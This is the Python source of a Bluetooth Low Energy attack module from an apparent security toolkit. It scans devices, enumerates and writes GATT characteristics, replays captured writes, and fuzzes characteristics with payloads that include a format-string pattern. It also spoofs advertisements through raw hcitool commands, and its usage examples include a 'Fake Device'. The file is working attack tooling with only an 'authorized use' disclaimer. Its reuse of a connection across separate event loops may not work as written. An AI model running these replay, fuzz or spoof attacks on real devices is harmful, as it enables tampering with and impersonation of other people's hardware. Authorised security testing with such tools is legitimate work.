#!/usr/bin/env python3
"""
BLE Attack Module for Hoover WiFi Security Toolkit
Bluetooth Low Energy GATT enumeration, read/write, replay, notification
capture, fuzzing, and (where hardware allows) advertisement spoofing.
For authorized security testing and research only.
"""

import argparse
import asyncio
import json
import os
import subprocess
import threading
import time
from datetime import datetime
from typing import Optional

from bleak import BleakClient, BleakScanner

from utils import setup_logging, validate_mac

SUPPORTED_MODES = ("scan", "enumerate", "replay", "spoof", "fuzz")

# Common fuzz patterns used against writable GATT characteristics.
DEFAULT_FUZZ_PATTERNS = [
    b"\x00" * 8,
    b"\xff" * 8,
    bytes(range(256))[:32],
    b"A" * 256,
    b"%s%s%s%s%s%n",
    b"",
    b"\x00",
    b"\xff",
]


class BLEAttack:
    """BLE GATT attack toolkit for authorized security testing.

    Provides device discovery, GATT service/characteristic enumeration,
    read/write operations, write replay, notification capture, fuzzing,
    and limited advertisement spoofing via BlueZ tooling.
    """

    def __init__(
        self,
        target_address: Optional[str] = None,
        attack_mode: str = "scan",
        scan_time: float = 10.0,
        output_dir: str = "captures",
        timeout: int = 120,
    ) -> None:
        self.target_address: Optional[str] = target_address
        self.attack_mode: str = attack_mode
        self.scan_time: float = scan_time
        self.output_dir: str = output_dir
        self.timeout: int = timeout
        self.logger = setup_logging("ble_attack")

        self._client: Optional[BleakClient] = None
        self._connected: bool = False
        self._lock = threading.Lock()
        self._start_time: Optional[float] = None
        self._running: bool = False

        self.devices: list[dict] = []
        self.gatt_map: dict = {}
        self.notifications: list[bytes] = []
        self.fuzz_results: list[dict] = []
        self.write_log: list[dict] = []

    # ------------------------------------------------------------------
    # Scanning
    # ------------------------------------------------------------------

    async def _async_scan(self) -> list:
        return await BleakScanner.discover(timeout=self.scan_time, return_adv=True)

    def scan_devices(self) -> list[dict]:
        """Scan for BLE devices with detailed advertisement data."""
        self._running = True
        self._start_time = time.time()
        self.logger.info("Scanning for BLE devices (%.1fs)...", self.scan_time)

        try:
            raw = asyncio.run(self._async_scan())
        except Exception as e:
            self.logger.error("BLE scan failed: %s", e)
            self._running = False
            return []

        results = []
        try:
            # bleak's return_adv=True discover() returns a dict of
            # address -> (BLEDevice, AdvertisementData)
            items = raw.values() if hasattr(raw, "values") else raw
        except Exception:
            items = raw

        for item in items:
            if isinstance(item, (tuple, list)) and len(item) == 2:
                device, adv = item
            else:
                device, adv = item, None
            parsed = self._parse_advertisement(device, adv)
            results.append(parsed)

        self.devices = results
        self._running = False
        self.logger.info("Found %d BLE devices", len(results))
        return results

    def _parse_advertisement(self, device, advertisement_data) -> dict:
        """Parse BLE advertisement: local name, service UUIDs, manufacturer data."""
        entry = {
            "address": getattr(device, "address", None),
            "name": getattr(device, "name", None) or "",
            "rssi": None,
            "local_name": None,
            "service_uuids": [],
            "manufacturer_data": {},
        }

        if advertisement_data is not None:
            entry["rssi"] = getattr(advertisement_data, "rssi", None)
            entry["local_name"] = getattr(advertisement_data, "local_name", None)
            service_uuids = getattr(advertisement_data, "service_uuids", None) or []
            entry["service_uuids"] = list(service_uuids)

            manufacturer_data = getattr(advertisement_data, "manufacturer_data", None) or {}
            parsed_mfg = {}
            for key, value in dict(manufacturer_data).items():
                try:
                    parsed_mfg[str(key)] = (
                        value.hex() if isinstance(value, (bytes, bytearray)) else str(value)
                    )
                except Exception:
                    parsed_mfg[str(key)] = repr(value)
            entry["manufacturer_data"] = parsed_mfg
        else:
            entry["rssi"] = getattr(device, "rssi", None)

        return entry

    # ------------------------------------------------------------------
    # Connection
    # ------------------------------------------------------------------

    async def _async_connect(self, address: str) -> bool:
        self._client = BleakClient(address, timeout=self.timeout)
        await self._client.connect()
        return self._client.is_connected

    def connect_device(self, address: str) -> bool:
        """Establish GATT connection to target device."""
        self.logger.info("Connecting to %s...", address)
        try:
            connected = asyncio.run(self._async_connect(address))
            self._connected = bool(connected)
            if self._connected:
                self.target_address = address
                self.logger.info("Connected to %s", address)
            else:
                self.logger.warning("Failed to connect to %s", address)
            return self._connected
        except Exception as e:
            self.logger.error("Connection to %s failed: %s", address, e)
            self._connected = False
            return False

    async def _async_disconnect(self) -> None:
        if self._client is not None:
            await self._client.disconnect()

    def disconnect_device(self) -> None:
        """Disconnect from current device."""
        if self._client is None:
            return
        try:
            asyncio.run(self._async_disconnect())
            self.logger.info("Disconnected from %s", self.target_address)
        except Exception as e:
            self.logger.warning("Error during disconnect: %s", e)
        finally:
            self._connected = False

    # ------------------------------------------------------------------
    # GATT enumeration
    # ------------------------------------------------------------------

    async def _async_enumerate_gatt(self) -> dict:
        result: dict = {"services": []}
        for service in self._client.services:
            svc_entry = {
                "uuid": str(service.uuid),
                "description": getattr(service, "description", "") or "",
                "characteristics": [],
            }
            for char in service.characteristics:
                char_entry = {
                    "uuid": str(char.uuid),
                    "description": getattr(char, "description", "") or "",
                    "properties": list(getattr(char, "properties", [])),
                    "value": None,
                    "descriptors": [],
                }

                if "read" in char_entry["properties"]:
                    try:
                        value = await self._client.read_gatt_char(char.uuid)
                        try:
                            char_entry["value"] = value.decode("utf-8")
                        except Exception:
                            char_entry["value"] = value.hex()
                    except Exception as e:
                        self.logger.debug("Could not read %s: %s", char.uuid, e)

                for descriptor in getattr(char, "descriptors", []) or []:
                    char_entry["descriptors"].append(
                        {
                            "uuid": str(getattr(descriptor, "uuid", "")),
                            "handle": getattr(descriptor, "handle", None),
                        }
                    )

                svc_entry["characteristics"].append(char_entry)
            result["services"].append(svc_entry)
        return result

    def enumerate_gatt(self) -> dict:
        """Full GATT service/characteristic/descriptor enumeration."""
        if self._client is None:
            self.logger.error("Not connected; call connect_device() first")
            return {"services": []}

        try:
            self.gatt_map = asyncio.run(self._async_enumerate_gatt())
            self.logger.info("Enumerated %d services", len(self.gatt_map.get("services", [])))
            return self.gatt_map
        except Exception as e:
            self.logger.error("GATT enumeration failed: %s", e)
            return {"services": []}

    # ------------------------------------------------------------------
    # Read / write
    # ------------------------------------------------------------------

    async def _async_read_characteristic(self, uuid: str) -> bytes:
        return await self._client.read_gatt_char(uuid)

    def read_characteristic(self, uuid: str) -> bytes:
        """Read a GATT characteristic by UUID."""
        if self._client is None:
            self.logger.error("Not connected; call connect_device() first")
            return b""

        try:
            value = asyncio.run(self._async_read_characteristic(uuid))
            return bytes(value)
        except Exception as e:
            self.logger.error("Failed to read characteristic %s: %s", uuid, e)
            return b""

    async def _async_write_characteristic(self, uuid: str, data: bytes, response: bool) -> None:
        await self._client.write_gatt_char(uuid, data, response=response)

    def write_characteristic(self, uuid: str, data: bytes, response: bool = True) -> bool:
        """Write to a GATT characteristic."""
        if self._client is None:
            self.logger.error("Not connected; call connect_device() first")
            return False

        try:
            asyncio.run(self._async_write_characteristic(uuid, data, response))
            with self._lock:
                self.write_log.append(
                    {
                        "uuid": uuid,
                        "data": data.hex(),
                        "response": response,
                        "timestamp": datetime.now().isoformat(),
                    }
                )
            self.logger.info("Wrote %d bytes to %s", len(data), uuid)
            return True
        except Exception as e:
            self.logger.error("Failed to write characteristic %s: %s", uuid, e)
            return False

    def _replay_write(self, uuid: str, data: bytes, count: int = 10, interval: float = 0.5) -> None:
        """Replay a captured write operation multiple times."""
        self.logger.info("Replaying write to %s (%d times, %.2fs interval)", uuid, count, interval)
        for i in range(count):
            self.write_characteristic(uuid, data)
            if i < count - 1 and interval > 0:
                time.sleep(interval)

    # ------------------------------------------------------------------
    # Advertisement spoofing
    # ------------------------------------------------------------------

    def _spoof_advertisement(
        self,
        name: Optional[str] = None,
        services: Optional[list[str]] = None,
        manufacturer_data: Optional[bytes] = None,
    ) -> None:
        """Spoof BLE advertisements (requires HCI raw access).

        REALISTIC LIMITATION: full BLE advertisement/packet manipulation is
        hardware dependent. This uses hcitool/hciconfig via BlueZ and only
        supports a limited subset of advertisement data (name, 16-bit
        service UUIDs). Specialized hardware (Ubertooth, nRF52840) is
        required for arbitrary raw packet injection.
        """
        services = services or []
        adv_data = bytearray()

        if name:
            name_bytes = name.encode("utf-8")[:26]
            adv_data += bytes([len(name_bytes) + 1, 0x09]) + name_bytes

        if services:
            uuid_bytes = bytearray()
            for svc in services:
                try:
                    uuid_bytes += int(svc, 16).to_bytes(2, "little")
                except Exception:
                    continue
            if uuid_bytes:
                adv_data += bytes([len(uuid_bytes) + 1, 0x03]) + bytes(uuid_bytes)

        if manufacturer_data:
            adv_data += bytes([len(manufacturer_data) + 1, 0xFF]) + manufacturer_data

        try:
            subprocess.run(
                ["hciconfig", "hci0", "leadv", "3"], check=False, capture_output=True, timeout=10
            )

            hex_bytes = " ".join(f"0x{b:02x}" for b in adv_data)
            cmd = [
                "hcitool",
                "-i",
                "hci0",
                "cmd",
                "0x08",
                "0x0008",
                f"0x{len(adv_data):02x}",
            ] + hex_bytes.split()
            subprocess.run(cmd, check=False, capture_output=True, timeout=10)
            self.logger.info(
                "Advertisement spoofing enabled (name=%s, services=%s)", name, services
            )
        except FileNotFoundError:
            self.logger.error("hcitool/hciconfig not found; cannot spoof advertisements")
        except Exception as e:
            self.logger.error("Advertisement spoofing failed: %s", e)

    # ------------------------------------------------------------------
    # Notifications
    # ------------------------------------------------------------------

    async def _async_capture_notifications(self, uuid: str, duration: float) -> list[bytes]:
        captured: list[bytes] = []

        def _callback(sender, data):
            captured.append(bytes(data))

        await self._client.start_notify(uuid, _callback)
        await asyncio.sleep(duration)
        await self._client.stop_notify(uuid)
        return captured

    def capture_notifications(self, uuid: str, duration: float = 10.0) -> list[bytes]:
        """Subscribe to notifications on a characteristic, capture data."""
        if self._client is None:
            self.logger.error("Not connected; call connect_device() first")
            return []

        try:
            captured = asyncio.run(self._async_capture_notifications(uuid, duration))
            with self._lock:
                self.notifications.extend(captured)
            self.logger.info("Captured %d notifications from %s", len(captured), uuid)
            return captured
        except Exception as e:
            self.logger.error("Failed to capture notifications on %s: %s", uuid, e)
            return []

    # ------------------------------------------------------------------
    # Fuzzing
    # ------------------------------------------------------------------

    def _fuzz_characteristic(self, uuid: str, patterns: Optional[list[bytes]] = None) -> list[dict]:
        """Write fuzz patterns to characteristic, record responses."""
        patterns = patterns if patterns is not None else DEFAULT_FUZZ_PATTERNS
        results = []

        for pattern in patterns:
            entry = {
                "uuid": uuid,
                "pattern": pattern.hex(),
                "pattern_length": len(pattern),
                "success": False,
                "error": None,
            }
            try:
                success = self.write_characteristic(uuid, pattern)
                entry["success"] = success
            except Exception as e:
                entry["error"] = str(e)
            results.append(entry)

        with self._lock:
            self.fuzz_results.extend(results)
        self.logger.info("Fuzzed %s with %d patterns", uuid, len(patterns))
        return results

    # ------------------------------------------------------------------
    # Results / status
    # ------------------------------------------------------------------

    def save_results(self) -> Optional[str]:
        """Save attack results to JSON."""
        os.makedirs(self.output_dir, exist_ok=True)
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"ble_attack_{timestamp}.json"
        filepath = os.path.join(self.output_dir, filename)

        results = {
            "target_address": self.target_address,
            "attack_mode": self.attack_mode,
            "devices": self.devices,
            "gatt_map": self.gatt_map,
            "notifications": [n.hex() for n in self.notifications],
            "fuzz_results": self.fuzz_results,
            "write_log": self.write_log,
            "timestamp": datetime.now().isoformat(),
        }

        try:
            with open(filepath, "w", encoding="utf-8") as f:
                json.dump(results, f, indent=2)
            self.logger.info("Results saved to %s", filepath)
            return filepath
        except Exception as e:
            self.logger.error("Failed to save results: %s", e)
            return None

    def get_status(self) -> dict:
        """Return current attack status."""
        elapsed = 0.0
        if self._start_time is not None:
            elapsed = time.time() - self._start_time

        return {
            "running": self._running,
            "connected": self._connected,
            "target_address": self.target_address,
            "attack_mode": self.attack_mode,
            "devices_found": len(self.devices),
            "notifications_captured": len(self.notifications),
            "fuzz_results_count": len(self.fuzz_results),
            "elapsed_seconds": round(elapsed, 1),
            "timeout": self.timeout,
        }


def main() -> None:
    parser = argparse.ArgumentParser(
        description="BLE Attack Toolkit - BLE GATT enumeration, read/write, "
        "replay, fuzzing, and advertisement spoofing",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Scan for BLE devices
  python3 ble_attack.py -m scan -t 15

  # Enumerate GATT services on a target
  python3 ble_attack.py -m enumerate --target AA:BB:CC:DD:EE:FF

  # Replay a captured write
  python3 ble_attack.py -m replay --target AA:BB:CC:DD:EE:FF \\
      --uuid 0000ffe1-0000-1000-8000-00805f9b34fb --write-data deadbeef \\
      --replay-count 20 --replay-interval 0.2

  # Fuzz a writable characteristic
  python3 ble_attack.py -m fuzz --target AA:BB:CC:DD:EE:FF \\
      --uuid 0000ffe1-0000-1000-8000-00805f9b34fb

  # Spoof an advertisement (requires BlueZ + HCI access)
  python3 ble_attack.py -m spoof --spoof-name "Fake Device"

WARNING: For authorized security testing and research only. Unauthorized
use against devices you do not own or lack explicit permission to test
may be illegal.
        """,
    )

    parser.add_argument("--target", help="Target BLE device address (XX:XX:XX:XX:XX:XX)")
    parser.add_argument(
        "-m",
        "--mode",
        choices=list(SUPPORTED_MODES),
        default="scan",
        help="Attack mode (default: scan)",
    )
    parser.add_argument(
        "-t",
        "--scan-time",
        type=float,
        default=10.0,
        help="Scan duration in seconds (default: 10.0)",
    )
    parser.add_argument("--uuid", help="GATT characteristic UUID for read/write/fuzz operations")
    parser.add_argument("--write-data", help="Hex string of data to write")
    parser.add_argument(
        "--replay-count", type=int, default=10, help="Number of replay iterations (default: 10)"
    )
    parser.add_argument(
        "--replay-interval", type=float, default=0.5, help="Seconds between replays (default: 0.5)"
    )
    parser.add_argument("--spoof-name", help="Name to spoof in advertisements")
    parser.add_argument(
        "-o",
        "--output-dir",
        default="captures",
        help="Output directory for results (default: captures)",
    )
    parser.add_argument(
        "--timeout", type=int, default=120, help="Overall timeout in seconds (default: 120)"
    )
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")

    args = parser.parse_args()

    if args.mode in ("enumerate", "replay", "fuzz") and not args.target:
        parser.error(f"--target is required for mode '{args.mode}'")

    if args.target and not validate_mac(args.target):
        parser.error(f"Invalid target MAC address: {args.target}")

    if args.mode == "replay" and not args.uuid:
        parser.error("--uuid is required for mode 'replay'")

    if args.mode == "fuzz" and not args.uuid:
        parser.error("--uuid is required for mode 'fuzz'")

    attack = BLEAttack(
        target_address=args.target,
        attack_mode=args.mode,
        scan_time=args.scan_time,
        output_dir=args.output_dir,
        timeout=args.timeout,
    )

    if args.mode == "scan":
        devices = attack.scan_devices()
        for d in devices:
            print(f"{d['address']}  {d['name'] or '<unnamed>'}  RSSI={d.get('rssi')}")

    elif args.mode == "enumerate":
        if attack.connect_device(args.target):
            gatt = attack.enumerate_gatt()
            print(json.dumps(gatt, indent=2))
            attack.disconnect_device()

    elif args.mode == "replay":
        if not args.write_data:
            parser.error("--write-data is required for mode 'replay'")
        data = bytes.fromhex(args.write_data)
        if attack.connect_device(args.target):
            attack._replay_write(args.uuid, data, args.replay_count, args.replay_interval)
            attack.disconnect_device()

    elif args.mode == "spoof":
        services = []
        attack._spoof_advertisement(name=args.spoof_name, services=services)

    elif args.mode == "fuzz":
        if attack.connect_device(args.target):
            results = attack._fuzz_characteristic(args.uuid)
            print(json.dumps(results, indent=2))
            attack.disconnect_device()

    attack.save_results()


if __name__ == "__main__":
    main()
